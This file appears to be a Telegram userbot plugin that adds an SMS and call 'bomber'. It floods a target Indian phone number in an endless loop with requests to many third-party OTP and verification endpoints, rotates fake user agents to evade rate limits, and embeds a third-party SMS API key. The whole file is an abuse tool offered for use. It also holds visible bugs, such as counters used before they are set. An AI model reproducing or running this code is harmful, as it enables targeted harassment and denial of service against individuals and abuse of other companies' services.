from os import system
import random
import string
import asyncio
import smtplib
from urllib.request import Request, urlopen
from fake_useragent import UserAgent
from userbot.events import register

print("Loading script, please wait !!")

ua = UserAgent()

@register(outgoing=True, pattern=r"^.bomb (.*)")
async def bomb(event):
    if event.fwd_From:
        return
    target = event.pattern_match.group(1)
    await event.edit("`Bombing : `"+target)
    result = await send(target)
    if result:
        await event.edit("`Bombed Successfully`")
    else:
        await event.edit("`Bomb Operation Unsuccessfull`") 


async def send(target):
    target_name = "lol"
    target_number = target

    if len(target_number)!=10:
        print("INVALID ENTRY !!")
        return False


    # Let's get Started !!

    while True:

        random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(4)])
        random_email = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(6)])

        bombers = {
        "OYO Rooms": "https://www.oyorooms.com/api/pwa/generateotp?phone="+target_number,
        "Delhivery": "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo="+target_number,
        "RailYatri": "https://www.railyatri.in/m/user-web-point?phone_number="+target_number,
        "ConfirmTkt": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="+target_number,
        "BereavedArtz": "https://bereaved-arts.000webhostapp.com/sms.php?no="+target_number,
        "ScriptTamilian": "http://scripttamilan.epizy.com/Sms.bomber/sms.php?no="+target_number,
        "JustDial": "https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="+target_number,
        "MagicBricks": "https://api.magicbricks.com/bricks/userappinstall.html?name="+random_name+"&email="+random_email+"@gmail.com&mobile="+target_number,
        "MagicBricks (Call)": "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile="+target_number,
        "Spring Edge (Demo)": "https://instantalerts.co/api/web/send?apikey=6ubqq88255zc9v0071n9856gxsl09p10i&sender=SEDEMO&to=91"+target_number+"&message=Hi%2C+this+is+a+test+message",
        "RedBus": "https://www.redbus.in/Personalization/SendOTP?mobile="+target_number+"&phoneCode=91&OTPSource=SIGNIN",
        "Wynk Music": "https://sapi.wynk.in/music/v2/account/otp?msisdn="+target_number,
        "Justdial": "https://win.justdial.com/10aug2016/sendvcode.php?mobile="+target_number,
        "ShahxHTML API": "http://shahxhtml.somee.com/bomber/pokkt.php?no="+target_number+"&l=1",
        "JustDial (Call)":"https://win.justdial.com/10aug2016/callme.php?mobile="+target_number+"&isdcode=0091&cCode=+91&wap=1"
        }

        api = random.choice(list(bombers))
        result_url=str(bombers[api])

        system("clear")

        print("Bombing in progress !!")
        print("Sit back and enjoy the fireworks !!")
        print("")
        print("Target Name             : "+str(target_name))
        print("Target Number           : +91-"+str(target_number))
        print("Number of Requests Sent : "+str(requested))
        print("Successful Requests     : "+str(success))
        print("Failed Requests         : "+str(failed))
        print("API used to BOMB Target : "+str(api))

        try:
            requested = requested + 1
            req = Request(str(result_url))
            req.add_header('User-Agent', ua.random)
            response = urlopen(req)
            data = str(response.read())

            if "limit" in data:
                failed = failed + 1
                continue
            if "exceed" in data:
                failed = failed + 1
                continue
            if "Error" in data:
                failed = failed + 1
                continue
            else:
                success = success + 1

        except :
            failed = failed + 1
            continue
    return True    
